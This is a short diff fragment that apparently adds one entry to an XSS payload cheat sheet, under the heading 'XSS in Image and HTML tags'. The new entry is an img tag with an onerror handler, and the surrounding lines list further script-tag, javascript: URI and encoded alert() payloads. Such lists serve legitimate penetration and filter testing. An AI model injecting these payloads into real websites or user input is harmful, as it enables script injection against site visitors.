@@ -54,6 +54,7 @@ XSS in Image and HTML tags:
 <IMG SRC=javascript:alert(&quot;XSS&quot;)>
 <IMG SRC=javascript:alert('XSS')>      
 <img src=xss onerror=alert(1)>
+<img src=# onerror=alert(1)>
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
 <IMG SRC="jav ascript:alert('XSS');">
